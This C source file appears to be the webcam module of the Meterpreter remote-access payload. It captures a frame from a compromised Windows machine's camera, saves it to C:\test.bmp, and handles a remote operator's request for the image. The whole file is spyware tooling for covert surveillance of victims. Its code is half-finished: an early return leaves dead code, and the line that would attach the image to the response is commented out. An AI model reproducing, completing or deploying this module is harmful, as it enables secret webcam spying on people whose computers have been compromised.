#include "../../common/common.h"
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <tchar.h>
#include <ntsecapi.h>
#include <string.h>
#include <stdlib.h>
#include <malloc.h>
#include <vfw.h>
#include "espia.h"

#pragma comment(lib, "vfw32.lib")

#define capSendMessage(hWnd, uMsg, wParm, lParam) ((IsWindow(hWnd)) ? SendMessage(hWnd, uMsg, (WPARAM)(wParm), (LPARAM)(lParam)) : 0)

BOOL capWebCam(char *szFile, int nIndex, int nX, int nY, int nMsg) 
{
	HWND hWndCap = capCreateCaptureWindow(NULL, WS_CHILD , 0, 0, nX, nY, GetDesktopWindow(), 0);


	if(!hWndCap) return FALSE;

	capDlgVideoSource(hWndCap);

	SetWindowLong(hWndCap,GWL_EXSTYLE,GetWindowLong(hWndCap,GWL_EXSTYLE));
	ShowWindow(hWndCap,TRUE);
	capSendMessage(hWndCap, WM_CAP_DRIVER_DISCONNECT, 0, 0);
	capSendMessage(hWndCap, WM_CAP_DRIVER_CONNECT, 0, 0);
	capSendMessage(hWndCap, WM_CAP_SET_SCALE, TRUE, 0);
	capSendMessage(hWndCap, WM_CAP_SET_PREVIEWRATE, 1, 0);
	capSendMessage(hWndCap, WM_CAP_SET_PREVIEW, TRUE, 0);
	capSendMessage(hWndCap, WM_CAP_GRAB_FRAME_NOSTOP, 0, 0);
	capSendMessage(hWndCap, WM_CAP_FILE_SAVEDIB, 0, szFile);
	DestroyWindow(hWndCap);

	return TRUE;
}


int GetCamIndex()
{
	int wIndex;
	char szDeviceName[80];
	char szDeviceVersion[80];

	for (wIndex = 0; wIndex < 9; wIndex++){
		if (capGetDriverDescriptionA(wIndex, szDeviceName, sizeof(szDeviceName), szDeviceVersion, sizeof(szDeviceVersion)))
			return wIndex;
	}
	return -1;
}

// TODO: perhaps find a way of sharing this code with passwd.c?
char *StringCombine(char *string1, char *string2) {
	size_t s1len, s2len;

	if (string2 == NULL) { // nothing to append
		return string1;
	}

	// TODO: what do we want to do if memory allocation fails?
	s2len = strlen(string2);
	if (string1 == NULL) { // create a new string
		string1 = (char *)malloc(s2len + 1);
		strncpy_s(string1, s2len + 1, string2, s2len + 1);
	} else {			   // append data to the string
		s1len = strlen(string1);
		string1 = (char *)realloc(string1, s1len + s2len + 1);
		strncat_s(string1, s1len + s2len + 1, string2, s2len + 1);
	}

	return string1;
}

int __declspec(dllexport) controlcam(char **imageresults) {
	DWORD dwError = 0;
	char *imagestring = NULL;

	/* METERPRETER CODE */
	// char buffer[100];
	/* END METERPRETER CODE */

	///////////////////
	int nIndex;
	
	nIndex= GetCamIndex();
	if(nIndex == -1){
		return nIndex;
	}
	capWebCam("C:\\test.bmp", nIndex, 640, 480, 10);
	return 0;
	////////////////////

	
	/* return hashresults */
	*imageresults = imagestring;

	/* return the correct code */
	return dwError;
}


/*
 * Grabs the Webcam Image.
 */
DWORD request_video_get_dev_image(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	char *image = NULL;

	do
	{
		if (controlcam(&image))
		{
			res = GetLastError();
			break;
		}

		//packet_add_tlv_string(response, TLV_TYPE_DEV_IMAGE, image);

	} while (0);

	packet_transmit_response(res, remote, response);

	if (image)
	free(image);

	return res;
}